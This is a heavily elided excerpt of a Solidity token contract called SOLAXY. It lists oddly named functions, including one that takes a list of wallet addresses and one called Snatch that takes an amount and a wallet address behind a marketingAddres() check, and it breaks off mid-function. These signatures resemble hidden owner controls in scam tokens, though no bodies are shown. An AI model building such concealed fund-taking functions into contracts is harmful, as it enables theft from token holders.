...
contract SOLAXY is Ownable {
    ...
    function Declassify() public {
    }
    function Outpouring() public {
    }
    function Ikryana(address[] calldata walletAddress) external {
    ...
    function Snatch(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
